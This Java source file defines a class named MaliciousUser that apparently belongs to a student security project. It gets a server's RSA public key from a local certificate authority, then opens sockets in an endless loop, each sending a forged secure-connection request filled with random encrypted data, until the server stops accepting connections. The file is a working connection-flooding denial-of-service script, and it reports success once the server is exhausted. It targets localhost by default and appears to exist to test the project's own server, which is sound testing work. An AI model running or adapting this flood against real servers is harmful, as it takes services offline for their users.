package client.malicious;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketException;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Random;

import javax.crypto.Cipher;

import message.Envelope;

import client.certificateAuthority.CAClient;

public class MaliciousUser
{
	private ArrayList<Socket> sockets;
	private final String host;
	private final int port;
	
	private static final String CA_LOC = "localhost";
	private static final String RSA_ALGORITHM = "RSA/None/NoPadding";
	private static final String PROVIDER = "BC";
	
	public MaliciousUser()
	{
		this("localhost", 8765);
	}
	
	public MaliciousUser(String host, int port)
	{
		this.sockets = new ArrayList<Socket>();
		this.host = host;
		this.port = port;
	}
	
	/* 16348 sockets until it will not try to make a new socket anymore.
	 * Apparently the normal server is still okay?
	 */
	public void run()
	{
		System.out.println("Connecting to CA");
		CAClient ca = new CAClient("ALPHA");
		ca.connect(CA_LOC, 4999, null);
		ca.run();
		ca.disconnect();
		RSAPublicKey serverPublicKey = (RSAPublicKey)ca.getPublicKey();
		
		Random r = new Random();
		byte[] trash = new byte[16];
		byte[] fakeChallenge = new byte[20];
		r.nextBytes(trash);
		r.nextBytes(fakeChallenge);
		byte[] encryptedTrash = encryptPublic(serverPublicKey, trash);
		byte[] encryptedFakeChallenge = encryptPublic(serverPublicKey, fakeChallenge);
		
		//Create a fake envelope with trash challenge and trash keys.  Generated once used multiple times.
		Envelope fakeRequest = new Envelope("REQUEST_SECURE_CONNECTION");
		fakeRequest.addObject(encryptedFakeChallenge);
		fakeRequest.addObject(encryptedTrash);
		fakeRequest.addObject(encryptedTrash);
		try
		{
			int counter = 0;
			while(true)
			{
				Socket newSocket = new Socket(this.host, this.port);
				System.out.println("Socket " + counter + " created...");
				ObjectOutputStream oos = new ObjectOutputStream(newSocket.getOutputStream());
				oos.writeObject(fakeRequest);
				this.sockets.add(newSocket);
				counter++;
			}
		}
		catch(ConnectException e)
		{
			e.printStackTrace();
			System.out.println("Success");
			for(Socket s : this.sockets)
			{
				try
				{
					s.close();
				}
				catch(IOException ex)
				{
					ex.printStackTrace();
				}
			}
		}
		catch(SocketException e)
		{
			e.printStackTrace();
			System.out.println("Success");
			for(Socket s : this.sockets)
			{
				try
				{
					s.close();
				}
				catch(IOException ex)
				{
					ex.printStackTrace();
				}
			}
		}
		catch(IOException e)
		{
			e.printStackTrace();
		}
	}
	
	private byte[] encryptPublic(RSAPublicKey pubKey, byte[] encoded)
	{
		try
		{
			Cipher oCipher = Cipher.getInstance(RSA_ALGORITHM, PROVIDER);
			oCipher.init(Cipher.ENCRYPT_MODE, pubKey); 
			return oCipher.doFinal(encoded);
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
		return null;
	}
	
	public static void main(String[] args)
	{
		MaliciousUser mu = new MaliciousUser();
		mu.run();
	}
}
